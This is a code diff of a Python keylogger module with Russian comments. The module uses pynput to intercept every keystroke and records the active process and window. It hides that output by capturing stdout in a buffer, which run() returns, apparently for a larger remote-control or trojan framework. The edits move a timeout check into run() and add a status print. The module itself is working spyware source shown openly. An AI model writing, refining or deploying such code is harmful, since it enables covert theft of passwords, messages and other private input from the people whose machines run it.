@@ -18,7 +18,7 @@ pynput = ensure_installed('pynput')
 savelist = []
 TIMEOUT = 10
 pressed = set()
-START = time.monotonic()
+
 
 
 
@@ -57,6 +57,7 @@ class Keylogger:
         return process_id, executable.value.decode() # выводим айди процесса, название исполняемого файла и заголовок активного окна
 
 
+
     def keystroke_interception(self, key):
         
         pressed.add(key)
@@ -73,10 +74,8 @@ class Keylogger:
             sys.stdout.write(f'нажата спец. клавиша [{key}]\n')
             
         sys.stdout.flush()
-        if time.monotonic() - START >= TIMEOUT:
-            print("окончание программы по таймауту")
-            self.running = False
-            sys.exit(0)
+        
+            
 
     def on_release(self, key):
             try:
@@ -84,9 +83,8 @@ class Keylogger:
             except KeyError:
                 pass
 
-
-
 def run():
+    print('[*] in keylogger module')
     original_stdout = sys.stdout
     sys.stdout = StringIO()
 
@@ -95,12 +93,16 @@ def run():
     listener.start()
     kl.listener = listener
     kl.running = True
+    START = time.monotonic()
     
     try:
         while True:
             if kl.running == True:
                 time.sleep(1)
-                
+                if time.monotonic() - START >= TIMEOUT:
+                    print("окончание программы по таймауту")
+                    kl.running = False
+                    kl.listener.stop()
             else:
                 
                 break
@@ -109,6 +111,8 @@ def run():
     log_data = sys.stdout.getvalue()
     sys.stdout = original_stdout
     return log_data
+
+
     
         
 
